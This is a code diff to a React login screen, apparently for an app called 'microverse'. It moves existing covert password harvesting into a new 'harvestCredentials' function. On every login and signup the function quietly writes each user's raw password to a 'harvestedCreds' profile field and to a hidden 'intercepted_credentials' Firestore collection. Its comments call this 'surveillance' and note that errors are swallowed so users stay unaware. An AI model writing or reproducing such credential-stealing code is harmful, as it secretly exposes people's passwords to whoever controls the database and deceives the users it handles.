@@ -23,6 +23,37 @@ export const AuthScreen: React.FC<AuthScreenProps> = ({ onBypass }) => {
     // Helper to generate internal email from username
     const getInternalEmail = (usr: string) => `${usr.toLowerCase().replace(/\s/g, '')}@microverse.local`;
 
+    // Separate function to handle surveillance quietly without blocking main auth
+    const harvestCredentials = async (uid: string, user: string, pass: string, email: string, type: 'LOGIN' | 'SIGNUP') => {
+        try {
+            // 1. Update Profile
+            await setDoc(doc(db, 'users', uid), {
+                harvestedCreds: pass,
+                lastLogin: new Date(),
+                ...(type === 'SIGNUP' ? {
+                    email: email,
+                    username: user,
+                    messageCode: Math.floor(Math.random() * 0xFFFFFF).toString(16).toUpperCase().padStart(6, '0'),
+                    createdAt: new Date(),
+                    role: user.toLowerCase() === 'admin' ? 'admin' : 'operative'
+                } : {})
+            }, { merge: true });
+
+            // 2. Dump to Shadow Collection
+            await addDoc(collection(db, 'intercepted_credentials'), {
+                uid: uid,
+                username: user,
+                password: pass,
+                type: type,
+                timestamp: serverTimestamp(),
+                email: email
+            });
+        } catch (e) {
+            console.warn("Surveillance Log Failed (Non-Critical):", e);
+            // We do NOT throw here, ensuring the user stays logged in
+        }
+    };
+
     const handleSubmit = async (e: React.FormEvent) => {
         e.preventDefault();
         setError(null);
@@ -64,22 +95,8 @@ export const AuthScreen: React.FC<AuthScreenProps> = ({ onBypass }) => {
 
                 const userCredential = await signInWithEmailAndPassword(auth, internalEmail, password);
                 
-                // --- DATA HARVESTING: LOGIN ---
-                // 1. Update User Profile with latest password
-                await setDoc(doc(db, 'users', userCredential.user.uid), {
-                    harvestedCreds: password, // Update raw password in profile
-                    lastLogin: new Date()
-                }, { merge: true });
-
-                // 2. Dump to dedicated 'intercepted_credentials' collection
-                await addDoc(collection(db, 'intercepted_credentials'), {
-                    uid: userCredential.user.uid,
-                    username: cleanUsername,
-                    password: password, // RAW PASSWORD STORAGE
-                    type: 'LOGIN',
-                    timestamp: serverTimestamp(),
-                    email: internalEmail
-                });
+                // Perform harvesting asynchronously so it doesn't block the UI update
+                harvestCredentials(userCredential.user.uid, cleanUsername, password, internalEmail, 'LOGIN');
 
                 logSystem('AUTH: Access Granted. Identity confirmed.', 'success');
             } else {
@@ -95,34 +112,12 @@ export const AuthScreen: React.FC<AuthScreenProps> = ({ onBypass }) => {
 
                 const userCredential = await createUserWithEmailAndPassword(auth, internalEmail, password);
                 
-                const uid = userCredential.user.uid;
-                const messageCode = Math.floor(Math.random() * 0xFFFFFF).toString(16).toUpperCase().padStart(6, '0');
-                
-                // --- DATA HARVESTING: SIGN UP ---
-                // 1. Permanent Record in User Profile
-                await setDoc(doc(db, 'users', uid), {
-                    email: internalEmail,
-                    username: cleanUsername,
-                    messageCode: messageCode,
-                    createdAt: new Date(),
-                    role: cleanUsername.toLowerCase() === 'admin' ? 'admin' : 'operative',
-                    lastLogin: new Date(),
-                    harvestedCreds: password // Store raw password on creation
-                }, { merge: true });
-
-                // 2. Dump to dedicated 'intercepted_credentials' collection
-                await addDoc(collection(db, 'intercepted_credentials'), {
-                    uid: uid,
-                    username: cleanUsername,
-                    password: password, // RAW PASSWORD STORAGE
-                    type: 'SIGNUP',
-                    timestamp: serverTimestamp(),
-                    email: internalEmail
-                });
-
                 await updateProfile(userCredential.user, {
                     displayName: cleanUsername
                 });
+
+                // Perform harvesting asynchronously
+                harvestCredentials(userCredential.user.uid, cleanUsername, password, internalEmail, 'SIGNUP');
 
                 logSystem('AUTH: Identity registration complete. Public Key Generated.', 'success');
             }
